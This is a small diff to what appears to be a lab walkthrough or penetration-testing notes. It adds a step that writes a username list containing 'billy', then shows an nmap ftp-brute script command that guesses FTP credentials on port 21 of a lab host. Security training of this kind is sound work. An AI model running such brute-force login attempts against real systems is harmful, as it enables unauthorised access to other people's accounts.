@@ -290,6 +290,8 @@ nmap -p21 -sV -O 192.14.30.3
 ```
 
 ```bash
+echo "billy" > users
+
 nmap --script ftp-brute --script-args userdb=/root/users -p21 192.14.30.3
 ```
 
